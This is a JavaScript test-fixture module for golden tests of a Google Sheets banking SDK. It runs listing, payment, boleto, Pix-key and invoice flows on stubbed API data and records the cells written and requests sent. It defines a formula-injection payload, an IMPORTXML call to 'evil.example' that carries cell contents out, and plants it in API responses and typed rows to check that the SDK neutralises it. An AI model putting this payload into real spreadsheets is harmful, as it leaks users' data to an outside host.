"use strict";

// Every flow of the SDK run on fixed data, with what it leaves behind: the cells it wrote, the requests
// it sent, the messages it showed and the files it saved. golden.test.js compares them with golden.json,
// which was recorded on master before the performance work, so a refactoring can show that nothing a
// person using the spreadsheet sees has changed.

const {legitimate, dictKeys, loggedInWorld, paged, CREATED, CREATED_LATE} = require("./listingFlows");

const HOSTILE = '=IMPORTXML("https://evil.example/?x="&A1,"//a")';
// The same text typed into a cell as text (the apostrophe is not part of the value).
const TYPED_HOSTILE = `'${HOSTILE}`;

// What Sheets gives for a date cell: midnight in the spreadsheet's time zone (GMT-3).
function date(year, month, day) {
  return new Date(Date.UTC(year, month - 1, day, 3));
}

function isDate(value) {
  return Object.prototype.toString.call(value) === "[object Date]";
}

// Runs one SDK function like a dialog would, keeping its result or the message of its error.
function run(world, name, ...args) {
  try {
    world.outcomes.push({name, result: world.invoke(name, ...args)});
  } catch (error) {
    world.outcomes.push({name, error: error && error.message !== undefined ? error.message : String(error)});
  }
}

function newWorld() {
  const world = loggedInWorld();
  world.outcomes = [];
  return world;
}

// Cells a flow must never touch: above its header and far to the right of its columns.
function sentinels(world, sheetName) {
  const sheet = world.workbook.getSheetByName(sheetName);
  sheet.getRange(9, 1).setValue("sentinela A9");
  sheet.getRange(11, 30).setValue("sentinela AD11");
}

// Rows typed into a sheet from row 11 on, the first column being A.
function fill(world, sheetName, rows, firstRow = 11) {
  const sheet = world.workbook.getSheetByName(sheetName);
  rows.forEach((values, index) => values.forEach((value, column) => sheet.getRange(firstRow + index, column + 1).setValue(value)));
}

const sheetOf = {
  ViewStatement: "Extrato", ViewTransfer: "Consulta de Transferência", ViewCharge: "Consulta de Boleto",
  ViewChargePayment: "Consulta de Pagamento Boleto", ViewInvoice: "Consulta de Invoices Emitidas",
  ViewPaymentRequest: "Consulta de Aprovações", fetchCustomers: "Consulta de Clientes",
};

function listing(name, args, route, listKey, items) {
  const world = newWorld();
  sentinels(world, sheetOf[name]);
  world.api.stub("GET", route, paged(listKey, items));
  run(world, name, ...args);
  return world;
}

function withHostile(items, fields) {
  return items.concat([{...items[0], ...Object.fromEntries(fields.map(field => [field, HOSTILE]))}]);
}

const boletoEvents = [
  {created: CREATED, boleto: {...legitimate.boletos[0], id: "6001", status: "paid", amount: 15500, fine: 2, barCode: "34191090086120772780871444640008591990000015000",
    streetLine1: "Rua A, 1", streetLine2: "Apto 2", district: "Centro", city: "São Paulo", stateCode: "SP", zipCode: "01000-000"}},
  {created: CREATED_LATE, boleto: {...legitimate.boletos[0], id: "6001", status: "paid", amount: 15600, fine: 2, barCode: "34191090086120772780871444640008591990000015000",
    streetLine1: "Rua A, 1", streetLine2: "", district: "Centro", city: "São Paulo", stateCode: "SP", zipCode: "01000-000"}},
  {created: CREATED, boleto: {...legitimate.boletos[1], id: "6002", status: "paid", amount: 90, fine: 0, barCode: "0000", streetLine1: "Av. B", streetLine2: "",
    district: "Bela Vista", city: "Rio de Janeiro", stateCode: "RJ", zipCode: "20000-000"}},
  {created: CREATED_LATE, boleto: {...legitimate.boletos[2], id: "6003", status: "paid", amount: 2500, fine: 1, barCode: HOSTILE, streetLine1: HOSTILE, streetLine2: "",
    district: "x", city: "y", stateCode: "SP", zipCode: "01000-001"}},
];

const nominalAmounts = {"6001": 15000, "6002": 99, "6003": 2500};

function boletoEventsFlow(registeredLogsFail = false) {
  const world = newWorld();
  sentinels(world, "Histórico de Boletos Emitidos");
  world.api.stub("GET", /^\/boleto\/log$/, request => {
    if (request.query.types !== "registered") {
      return paged("logs", boletoEvents)(request);
    }
    if (registeredLogsFail) {
      return {status: 500, body: {errors: [{code: "internalServerError", message: "Erro interno"}]}};
    }
    const logs = request.query.boletoIds.split(",").map(id => ({boleto: {id, amount: nominalAmounts[id], fine: 2}}));
    return paged("logs", logs)(request);
  });
  run(world, "viewChargeEvents", "2024-03-01", "2024-03-31", "paid");
  return world;
}

function splitsFlow() {
  const world = newWorld();
  sentinels(world, "Split Consultas");
  const splits = [
    {created: CREATED, source: "invoice/7001", receiverId: "r1", amount: 300, status: "success"},
    {created: CREATED_LATE, source: "invoice/7001", receiverId: "r2", amount: 200, status: "processing"},
    {created: CREATED, source: HOSTILE, receiverId: "r1", amount: 1, status: HOSTILE},
  ];
  const taxIds = {r1: "012.345.678-90", r2: HOSTILE};
  world.api.stub("GET", /^\/split$/, paged("splits", splits));
  world.api.stub("GET", /^\/split-receiver$/, request => ({body: {receivers: request.query.ids.split(",").map(id => ({id, taxId: taxIds[id]}))}}));
  run(world, "viewSplits", "2024-03-01", "2024-03-31", "success");
  return world;
}

function greetingsFlow() {
  const world = newWorld();
  world.api.stub("GET", /^\/balance$/, () => ({body: {balances: [{amount: 123456}]}}));
  run(world, "SetAllGreetings");
  return world;
}

const transferRows = [
  ["José da Silva", "012.345.678-90", 1234.56, "'341", "'0001", "12345-6", date(2024, 4, 10), "checking", "fornecedor,abril", "Pagamento abril", "Obrigado"],
  ["Empresa Ç Ltda", "12.345.678/0001-90", 10, "'20018183", "'1234", "'98765", "", "", "", "", ""],
  [TYPED_HOSTILE, "'98765432100", 0.01, "'001", "'4321", "'1", "", "savings", "a", TYPED_HOSTILE, ""],
];

function paymentRequestTransfersFlow(answer = {body: {requests: []}}, runs = 1, rows = transferRows) {
  const world = newWorld();
  sentinels(world, "Transferência com Aprovação");
  fill(world, "Transferência com Aprovação", rows);
  world.api.stub("POST", /^\/payment-request$/, () => answer);
  for (let index = 0; index < runs; index++) {
    run(world, "managePaymentRequestTransfer", "center-1");
  }
  return world;
}

const boletoPaymentRows = [
  ["'34191.09008 61207.727808 71444.640008 5 91990000015000", "012.345.678-90", "2024-04-10", "Conta de luz", ""],
  ["'34191090086120772780871444640008591990000015", "12.345.678/0001-90", date(2024, 4, 11), "Conta de água", ""],
];

function boletoPaymentsFlow(rows = boletoPaymentRows, answer = {body: {requests: []}}) {
  const world = newWorld();
  sentinels(world, "Pagamento de Boletos");
  fill(world, "Pagamento de Boletos", rows);
  world.api.stub("POST", /^\/payment-request$/, () => answer);
  run(world, "executeBoletoPayment", "center-1");
  return world;
}

function invoicesFlow() {
  const world = newWorld();
  sentinels(world, "Emissão de Invoice Pix");
  fill(world, "Emissão de Invoice Pix", [
    ["Ana Souza", "012.345.678-90", 100.5, date(2024, 4, 10), 2, 1, 48, "Pedido", "'123", "Loja", "Centro", "", ""],
    ["Carlos Ção", "98765432100", 7, "", "", "", "", "", "", "", "", "Nota", 55],
  ]);
  world.api.stub("POST", /^\/invoice$/, () => ({body: {invoices: []}}));
  run(world, "sendInvoices");
  return world;
}

function splitReceiversFlow() {
  const world = newWorld();
  sentinels(world, "Split Receivers");
  fill(world, "Split Receivers", [
    ["Recebedor A", "012.345.678-90", "'341", "'0001", "'12345-6", "checking", "parceiro, sp"],
    ["Recebedor B", "12.345.678/0001-90", "'20018183", "'1234", "'777", "payment", ""],
  ]);
  world.api.stub("POST", /^\/split-receiver$/, () => ({body: {receivers: []}}));
  run(world, "SplitReceivers");
  return world;
}

function cartFlow() {
  const world = newWorld();
  sentinels(world, "Solicitação de Cartões");
  fill(world, "Solicitação de Cartões", [
    ["Kit Básico", "Stark Bank", "Maria Silva", "MARIA S", "'11999999999", "rua das flores, 10", "apto 2", "Centro", "São Paulo", " sp ", "'01000000"],
    ["Kit Premium", "Loja", "João Ção", "JOAO", "'(11) 3333-4444", "", "", "Bela Vista", "Rio", "RJ", "'20000-000"],
  ]);
  world.api.stub("POST", /^\/corporate-shop-cart$/, () => ({body: {cart: {id: "cart-1"}}}));
  world.api.stub("GET", /^\/corporate-shop-kit$/, () => ({body: {kits: [{id: "kit-1", name: "Kit Básico"}, {id: "kit-2", name: "Kit Premium"}, {id: "kit-3", name: HOSTILE}]}}));
  world.api.stub("POST", /^\/corporate-shop-item$/, () => ({body: {items: []}}));
  run(world, "cartShop");
  return world;
}

function boletoCreationFlow() {
  const world = newWorld();
  sentinels(world, "Emissão de Boletos");
  fill(world, "Emissão de Boletos", [
    ["José Ção", "012.345.678-90", "Rua Três, 3", "Casa", "Centro", "São Paulo", "SP", "'01000-000", 150.75, date(2024, 4, 10), 2, 1, 30, 5, date(2024, 4, 5),
      "Serviço", 100, "Taxa", 50.75, "", "", "loja,sp"],
    ["Empresa", "12.345.678/0001-90", "Av. B", "", "Bela Vista", "Rio", "RJ", "'20000-000", 10, "", "", "", "", "", "", "", "", "", "", "", "", ""],
  ]);
  world.api.stub("POST", /^\/boleto$/, () => ({body: {boletos: []}}));
  run(world, "createBoleto");
  return world;
}

function customerCreationFlow() {
  const world = newWorld();
  sentinels(world, "Cadastro de Clientes");
  fill(world, "Cadastro de Clientes", [
    ["Maria", "012.345.678-90", "maria@example.com", "'+5511999999999", "Rua A", "", "Centro", "São Paulo", "SP", "'01000-000", "vip,sp"],
  ]);
  world.api.stub("POST", /^\/boleto\/customer$/, () => ({body: {customers: []}}));
  run(world, "createCustomers");
  return world;
}

// The approval tab already has older rows when the keys are moved into it.
function pixKeysMovedFlow() {
  const world = newWorld();
  world.api.stub("GET", /^\/dict-key\/.+$/, request => ({body: dictKeys[decodeURIComponent(request.path.replace("/dict-key/", ""))]}));
  sentinels(world, "Consulta de Chave PIX");
  sentinels(world, "Transferência com Aprovação");
  fill(world, "Transferência com Aprovação", [1, 2, 3, 4].map(index => [`Antigo ${index}`, "'012", 1, "'341", "'0001", "'1", "", "", "", "", "", "Enviado", ""]));
  fill(world, "Consulta de Chave PIX", [
    ["a@b.com", 1000, "tag1", "Pagamento A", "Fatura A"],
    ["'5511999999999", 2550, "tag2,tag3", "Pagamento B", "Fatura B"],
  ]);
  world.alertAnswer = "OK";
  run(world, "getDictKey");
  return world;
}

function pixKeysWithErrorsFlow() {
  const world = newWorld();
  world.api.stub("GET", /^\/dict-key\/.+$/, request => {
    const key = decodeURIComponent(request.path.replace("/dict-key/", ""));
    return dictKeys[key] ? {body: dictKeys[key]} : {status: 400, body: {errors: [{code: "invalidPixKey", message: "chave inválida"}]}};
  });
  sentinels(world, "Consulta de Chave PIX");
  fill(world, "Consulta de Chave PIX", [
    ["a@b.com", 1000, "tag1", "Pagamento A", "Fatura A"],
    ["'5511999999999", 2550, "tag2", "Pagamento B", "Fatura B", "Já consultado", "1", "2", "3", "4", "phone"],
    ["nao-existe@b.com", 5, "", "Pagamento X", ""],
    ["123e4567-e89b-12d3-a456-426614174000", 7, "", "Pagamento C", ""],
  ]);
  world.alertAnswer = "OK";
  run(world, "getDictKey");
  return world;
}

function downloadListsFlow() {
  const world = newWorld();
  world.api.stub("GET", /^\/transfer$/, paged("transfers", legitimate.transfers));
  world.api.stub("GET", /^\/boleto$/, paged("boletos", legitimate.boletos));
  world.api.stub("GET", /^\/boleto-payment$/, paged("payments", legitimate.chargePayments));
  run(world, "ViewTransfer", "2024-03-01", "2024-03-31", "");
  run(world, "ViewCharge", "2024-03-01", "2024-03-31", "");
  run(world, "ViewChargePayment", "2024-03-01", "2024-03-31", "");
  run(world, "getTransferDownloadList");
  run(world, "getChargeDownloadList");
  run(world, "getChargePaymentDownloadList");
  return world;
}

function driveDownloadsFlow() {
  const world = downloadListsFlow();
  world.outcomes = [];
  world.api.requests.length = 0;
  world.api.stub("GET", /^\/(transfer|boleto|boleto-payment)\/[^/]+\/pdf$/, request => ({body: {pdf: request.path}}));
  run(world, "TransferDownloadAllDrive");
  run(world, "ChargeDownloadAllDrive");
  run(world, "ChargePaymentDownloadAllDrive");
  return world;
}

const flows = {
  statement: () => listing("ViewStatement", ["2024-03-01", "2024-03-31"], /^\/transaction$/, "transactions",
    withHostile(legitimate.transactions, ["description", "id"])),
  emptyStatement: () => listing("ViewStatement", ["2024-03-01", "2024-03-31"], /^\/transaction$/, "transactions", []),
  transfers: () => listing("ViewTransfer", ["2024-03-01", "2024-03-31", "success"], /^\/transfer$/, "transfers",
    withHostile(legitimate.transfers, ["name", "taxId", "accountNumber"])),
  boletos: () => listing("ViewCharge", ["2024-03-01", "2024-03-31", "registered"], /^\/boleto$/, "boletos",
    withHostile(legitimate.boletos, ["name", "line", "id"])),
  boletoPayments: () => listing("ViewChargePayment", ["2024-03-01", "2024-03-31", "success"], /^\/boleto-payment$/, "payments",
    withHostile(legitimate.chargePayments, ["description", "line"])),
  invoices: () => listing("ViewInvoice", ["2024-03-01", "2024-03-31", "paid"], /^\/invoice$/, "invoices",
    withHostile(legitimate.invoices.concat([{...legitimate.invoices[0], id: "7003", splits: [{amount: 1}, {amount: 2}, {amount: 3}, {amount: 4}]}]), ["name", "brcode", "pdf"])),
  paymentRequests: () => listing("ViewPaymentRequest", ["2024-03-01", "2024-03-31", "pending", "center-1", "transfer"], /^\/payment-request$/, "requests",
    withHostile(legitimate.paymentRequests, ["description", "id"])),
  // An item without the approver the row shows: the page fails while it is being written.
  paymentRequestsWithoutApprover: () => listing("ViewPaymentRequest", ["2024-03-01", "2024-03-31", "", "center-1", "transfer"], /^\/payment-request$/, "requests",
    [legitimate.paymentRequests[0], {...legitimate.paymentRequests[0], id: "2099", actions: [{name: "Criador"}]}, legitimate.paymentRequests[1]]),
  paymentRequestsEndingInBoleto: () => listing("ViewPaymentRequest", ["2024-03-01", "2024-03-31", "", "center-1", "boleto-payment"], /^\/payment-request$/, "requests",
    legitimate.paymentRequests.slice(0, 2)),
  customers: () => listing("fetchCustomers", [], /^\/boleto\/customer$/, "customers", withHostile(legitimate.customers, ["name", "email"])),
  boletoEvents: () => boletoEventsFlow(),
  boletoEventsRegisteredLogsFail: () => boletoEventsFlow(true),
  splits: splitsFlow,
  greetings: greetingsFlow,
  paymentRequestTransfers: () => paymentRequestTransfersFlow(),
  paymentRequestTransfersRejected: () => paymentRequestTransfersFlow({status: 400, body: {errors: [
    {code: "invalidPayment", message: "Element 1: conta inválida"}, {code: "invalidPayment", message: "Element 2: nome inválido"}]}}),
  paymentRequestTransfersTwice: () => paymentRequestTransfersFlow({body: {requests: []}}, 2),
  paymentRequestTransfersRepeatedRow: () => paymentRequestTransfersFlow({body: {requests: []}}, 1, [transferRows[0], transferRows[1], transferRows[0]]),
  // A tax id typed without punctuation is a number for Sheets.
  paymentRequestTransfersNumericTaxId: () => paymentRequestTransfersFlow({body: {requests: []}}, 1, [
    ["José da Silva", 1234567890, 10, "'341", "'0001", "'123", "", "", "", "", ""],
  ]),
  boletoPaymentRequests: () => boletoPaymentsFlow(),
  boletoPaymentRequestsRejected: () => boletoPaymentsFlow(boletoPaymentRows, {status: 400, body: {errors: [{code: "invalidPayment", message: "Element 0: linha inválida"}]}}),
  boletoPaymentRequestsRepeatedRow: () => boletoPaymentsFlow([boletoPaymentRows[0], boletoPaymentRows[1], boletoPaymentRows[0]]),
  boletoPaymentRequestsWithTags: () => boletoPaymentsFlow([["'34191.09008 61207.727808 71444.640008 5 91990000015000", "012.345.678-90", "", "Conta", "a,b"]]),
  invoiceCreation: invoicesFlow,
  splitReceiverCreation: splitReceiversFlow,
  cart: cartFlow,
  boletoCreation: boletoCreationFlow,
  customerCreation: customerCreationFlow,
  pixKeysMoved: pixKeysMovedFlow,
  pixKeysWithErrors: pixKeysWithErrorsFlow,
  downloadLists: downloadListsFlow,
  driveDownloads: driveDownloadsFlow,
};

function cellValue(value) {
  return isDate(value) ? `date:${value.toISOString()}` : value;
}

// Every cell as "row,column|kind|value" (kind: f = formula, t = text, n = number, b = boolean, d = date).
function cellsOf(sheet) {
  return Array.from(sheet.cells.entries())
    .map(([key, value]) => {
      const kind = sheet.formulaCells.has(key) ? "f" : isDate(value) ? "d" : typeof value === "number" ? "n" : typeof value === "boolean" ? "b" : "t";
      return {key, text: `${key}|${kind}|${cellValue(value)}`};
    })
    .sort((a, b) => {
      const [ar, ac] = a.key.split(",").map(Number);
      const [br, bc] = b.key.split(",").map(Number);
      return ar - br || ac - bc;
    })
    .map(({text}) => text);
}

function payloadOf(payload) {
  try {
    return payload ? JSON.parse(payload) : payload;
  } catch (error) {
    return payload;
  }
}

function recordFlow(world) {
  const cells = {};
  for (const sheet of world.workbook.sheets.values()) {
    const values = cellsOf(sheet);
    if (values.length > 0) cells[sheet.name] = values;
  }
  return JSON.parse(JSON.stringify({
    cells,
    requests: world.api.requests.map(({method, path, query, payload}) => ({method, path, query, payload: payloadOf(payload)})),
    messages: world.browserMessages,
    alerts: world.alerts,
    dialogs: world.dialogs.map(dialog => dialog.title),
    logs: world.logs,
    driveFiles: world.driveFiles,
    outcomes: world.outcomes || [],
  }));
}

module.exports = {flows, recordFlow, HOSTILE, date, fill, newWorld, run, sentinels};
